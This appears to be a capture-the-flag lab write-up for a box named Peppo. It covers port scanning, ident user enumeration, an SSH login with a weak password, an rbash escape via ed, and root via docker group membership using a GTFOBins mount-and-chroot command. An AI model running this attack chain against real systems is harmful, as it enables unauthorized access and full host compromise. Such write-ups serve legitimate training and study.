##### Tags: `docker`  `rbash`  `export path`  `ident` 

# 🐧Peppo🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.223.60 

PORT      STATE  SERVICE           VERSION
22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
113/tcp   open   ident             FreeBSD identd
5432/tcp  open   postgresql        PostgreSQL DB 9.6.0 or later
8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
10000/tcp open   snet-sensor-mgmt?
```
port 113 is running ident  
run ident-user-enum and found the user eleanor
```console
$ ident-user-enum 192.168.223.60 22 113 5432 8080 10000
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.223.60:22       root
192.168.223.60:113      nobody
192.168.223.60:5432     <unknown>
192.168.223.60:8080     <unknown>
192.168.223.60:10000    eleanor
```
eleanor using weak password eleanor for ssh  
but we are in a restricted shell
```console
$ ssh eleanor@192.168.223.60     
eleanor@192.168.223.60's password:eleanor 

eleanor@peppo:~$ id
-rbash: id: command not found
```
we can only run command inside /home/eleanor/bin
```console
eleanor@peppo:~$ echo $PATH
/home/eleanor/bin
```
we can run ed to create new path
```console
eleanor@peppo:~$ ls -la bin
total 8
drwxr-xr-x 2 eleanor eleanor 4096 Jun  1  2020 .
drwxr-xr-x 4 eleanor eleanor 4096 Mar 16 06:51 ..
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chmod -> /bin/chmod
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chown -> /bin/chown
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ed -> /bin/ed
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ls -> /bin/ls
lrwxrwxrwx 1 root    root       7 Jun  1  2020 mv -> /bin/mv
lrwxrwxrwx 1 root    root       9 Jun  1  2020 ping -> /bin/ping
lrwxrwxrwx 1 root    root      10 Jun  1  2020 sleep -> /bin/sleep
lrwxrwxrwx 1 root    root      14 Jun  1  2020 touch -> /usr/bin/touch
```
run ed and export a new path
```console
eleanor@peppo:~$ ed
!/bin/bash
eleanor@peppo:~$ export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin

eleanor@peppo:~$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
```
## Privilege Escalation
We escaped the restricted shell and found user eleanor is part of the docker group  
https://gtfobins.org/gtfobins/docker/#shell 

```console
eleanor@peppo:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        5 years ago         542MB
postgres            latest              adf2b126dda8        5 years ago         313MB
```
use redmine and edit the command from GTFOBin 
```console
eleanor@peppo:~$ docker run -v /:/mnt --rm -it redmine chroot /mnt /bin/bash
root@d1dc6728081a:/# id
uid=0(root) gid=0(root) groups=0(root)
```
